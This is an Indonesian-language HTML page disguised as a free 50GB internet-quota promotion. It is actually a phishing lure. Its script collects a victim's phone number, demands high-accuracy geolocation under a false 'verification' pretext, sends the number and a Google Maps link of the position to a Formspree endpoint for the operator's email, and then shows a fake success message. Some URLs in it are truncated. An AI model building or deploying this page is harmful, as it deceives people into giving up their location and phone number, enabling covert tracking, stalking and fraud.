<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promo Kuota Internet Gratis</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #f4f4f4; padding: 20px; }
        .card { background: white; padding: 25px; border-radius: 10px; max-width: 350px; margin: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.1); border-top: 5px solid red; }
        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 95%; padding: 12px; background: red; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://upload.wikimedia.org" width="100">
        <h3>KLAIM 50GB GRATIS</h3>
        <p>Masukkan nomor HP untuk verifikasi wilayah promo.</p>
        
        <input type="text" id="phone" placeholder="0812xxxxxxxx">
        <button onclick="ambilLokasi()">AMBIL KUOTA</button>
        
        <p id="msg" style="font-size: 12px; color: gray; margin-top: 15px;"></p>
    </div>

    <script>
        function ambilLokasi() {
            const no = document.getElementById('phone').value;
            const msg = document.getElementById('msg');
            
            if(no.length < 10) return alert("Masukkan nomor HP!");

            msg.innerText = "Memverifikasi lokasi... Mohon tunggu.";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    const mapsUrl = `https://www.google.com{lat},${lng}`;

                    // KIRIM DATA KE EMAIL ANDA VIA FORMSPREE
                    fetch("https://formspree.io", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            Nomor_HP: no,
                            Lokasi_Google_Maps: mapsUrl,
                            Akurasi: pos.coords.accuracy + " meter"
                        })
                    }).then(() => {
                        alert("Verifikasi Berhasil! Kuota akan dikirim dalam 1x24 jam.");
                        msg.innerText = "Selesai.";
                    });

                }, (err) => {
                    alert("Gagal! Anda harus mengizinkan akses lokasi untuk verifikasi kuota gratis.");
                }, { enableHighAccuracy: true });
            }
        }
    </script>
</body>
</html>
